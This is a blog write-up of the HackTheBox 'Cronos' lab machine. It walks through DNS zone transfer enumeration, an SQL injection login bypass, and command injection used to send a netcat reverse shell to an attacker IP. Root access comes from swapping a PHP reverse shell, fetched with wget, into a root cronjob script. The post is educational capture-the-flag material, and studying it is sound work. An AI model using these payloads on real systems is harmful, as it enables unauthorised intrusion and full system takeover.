---
layout: post
title: "HackTheBox - Cronos"
description: "Walkthrough of Cronos box on Hackthebox."
thumb_image: "documentation/cronosthumb.png"
tags: [ hackthebox ]
---

{% include image.html path="documentation/cronos.webp"
path-detail="documentation/cronos.webp"
alt="HTB Cronos" %}

## HTB - Cronos

IP - 10.10.10.13

### Overview

This box was a medium level linux box on HTB created by [ch4p](https://www.hackthebox.eu/home/users/profile/1), it started with emunerating dns to find vhost `cronos.htb` and `admin.cronos.htb`, then the bypassing login page on `admin.cronos.htb` by sqli. After that we use command injection on ping utility to get a reverse shell as `www-data`. We privesc to root from www-data by modifying a script `artisan` that is running every minute by a cronjob as root. 

### Enumeration

As always let’s start off with nmap script nmap -sC for default scripts ~~Alright, if it isn’t obvious yet I am a IPPSEC fanboi.~~ Aight, firing up nmap to scan all open ports on the box.

{% highlight bash %}
nmap -sC -sV -o nmap/initial 10.10.10.13
{% endhighlight %} 
And here is our nmap result
{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
└──╼ $sudo nmap -sC -sV -o nmap/initial 10.10.10.13
[sudo] password for fumenoid: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-29 13:40 IST
Nmap scan report for 10.10.10.13
Host is up (0.11s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.50 seconds
{% endhighlight %}

Aight let's start enumerating the webserver first, as well as run an all port scan. 

#### Enumerating the web server

{% include image.html path="documentation/cronosdefault.webp"
path-detail="documentation/cronosdefault.webp"
alt="HTB Cronos" %}

Seems like a default Apache page, running gobuster for directory bruteforcing but it found nothing D:

#### Enumerating the DNS server

First we use nslookup to find the base domain that is `cronos.htb`, here we use `10.10.10.13` as our dns server by `-server 10.10.10.13` and enumerate `10.10.10.13`.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
└──╼ $nslookup -query=ANY -server 10.10.10.13 -host 10.10.10.13
*** Invalid option: server
*** Invalid option: host
Server:		10.10.10.13
Address:	10.10.10.13#53

13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
{% endhighlight %} 

Now we can use zone transfer to enumerate more.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
└──╼ $dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.16.2-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 92 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Sun Nov 29 14:35:44 IST 2020
;; XFR size: 7 records (messages 1, bytes 203)

{% endhighlight %} 

And we discovered `admin.cronos.htb`, `cronos.htb` and `ns1.cronos.htb`, let's add them to `/etc/hosts` and now we can start enumerating these subdomains.


#### Enumerating the cronos.htb

{% include image.html path="documentation/cronoslaravel.webp"
path-detail="documentation/cronoslaravel.webp"
alt="HTB Cronos" %}

A php website build using laravel. Running gobuster again but wasn't able to find anything useful again, then I searched for `laravel` exploits using searchsploit.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
└──╼ $searchsploit laravel
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Laravel - 'Hash::make()' Password Truncation Security                                                | multiple/remote/39318.txt
Laravel Log Viewer < 0.13.0 - Local File Download                                                    | php/webapps/44343.py
PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasplo | linux/remote/47129.rb
UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                                            | php/webapps/48166.txt
UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload                                   | php/webapps/46389.py
----------------------------------------------------------------------------------------------------- ---------------------------------
{% endhighlight %} 

Exploit 1,2,4,5 can easily be discarded and seems like for exploit 3 we need `App_token` but we don't have `lfi` or any other vuln that can be used to dump it. So shifting my focus to `admin.cronos.htb`.

#### Enumerating the admin.cronos.htb

A login pannel, I tried default creds like `admin:admin` & `admin:password` but they didn't worked and from response it seems we can't even enumerate users.

{% include image.html path="documentation/cronosadmin.webp"
path-detail="documentation/cronosadmin.webp"
alt="HTB Cronos" %}

#### Foothold

Trying SQLi payloads on the admin login page on admin.cronos.htb, `' or 1=1 -- -` worked and we bypassed the login page, now we have access to `Net Tools`.

{% include image.html path="documentation/cronosnettools.webp"
path-detail="documentation/cronosnettools.webp"
alt="HTB Cronos" %}

Discovering `command injection` in the `ping` utility.

{% include image.html path="documentation/cronoscommandi.webp"
path-detail="documentation/cronoscommandi.webp"
alt="HTB Cronos" %}

### Exploitation

Exploiting command injection vuln with this netcat reverse shell payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 9889 >/tmp/f` from [pentestermonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

{% include image.html path="documentation/cronoscommandirev.webp"
path-detail="documentation/cronoscommandirev.webp"
alt="HTB Cronos" %}

And looking at our `netcat` listner, yep we got a shell as `www-data`.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
└──╼ $rlwrap nc -lvnp 9889
listening on [any] 9889 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.13] 39038
/bin/sh: 0: cant access tty; job control turned off
$ whoami
www-data
$ 
{% endhighlight %} 

### Getting User

Getting the user flag is easy as `www-data` has perms to read the flag.

{% highlight bash %}
www-data@cronos:/home/noulis$ ls -la user.txt
ls -la user.txt
-r--r--r-- 1 noulis noulis 33 Mar 22  2017 user.txt
www-data@cronos:/home/noulis$ wc -c user.txt
wc -c user.txt
33 user.txt
www-data@cronos:/home/noulis$
{% endhighlight %} 

### Rooting the box

In post enumeration running `linpeas.sh` from [Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) discovers a cronjob running as root.

{% highlight bash %}
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
{% endhighlight %} 

`www-data` had read and write perm on `artisan` script, so I created a php reverse shell in my host system using this [pentester monkey php reverse shell](https://github.com/pentestmonkey/php-reverse-shell) and then replaced it with the `artisan` script on the box.

{% highlight bash %}
www-data@cronos:/var/www/laravel$ wget http://10.10.14.3:8000/shell.php
wget http://10.10.14.3:8000/shell.php
--2020-11-29 13:14:26--  http://10.10.14.3:8000/shell.php
Connecting to 10.10.14.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3479 (3.4K) [application/octet-stream]
Saving to: 'shell.php'

shell.php           100%[===================>]   3.40K  --.-KB/s    in 0s      

2020-11-29 13:14:26 (9.64 MB/s) - 'shell.php' saved [3479/3479]

www-data@cronos:/var/www/laravel$ ls
ls
CHANGELOG.md   composer.lock  phpunit.xml  server.php  webpack.mix.js
app	       composer.phar  public	   shell.php
artisan        config	      readme.md    storage
bootstrap      database       resources    tests
composer.json  package.json   routes	   vendor
www-data@cronos:/var/www/laravel$ rm artisan; mv shell.php artisan
rm artisan; mv shell.php artisan
www-data@cronos:/var/www/laravel$ ls
ls
CHANGELOG.md  composer.json  database	   readme.md   storage
app	      composer.lock  package.json  resources   tests
artisan       composer.phar  phpunit.xml   routes      vendor
bootstrap     config	     public	   server.php  webpack.mix.js
{% endhighlight %} 

Checking our `netcat` listner and we get our root revshell.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Cronos]
└──╼ $rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.13] 57370
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 13:15:01 up  3:04,  0 users,  load average: 0.00, 0.02, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: cant access tty; job control turned off
# whoami
root
# cd /root
# ls
root.txt
# wc -c root.txt
33 root.txt
# 
{% endhighlight %} 

###### Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.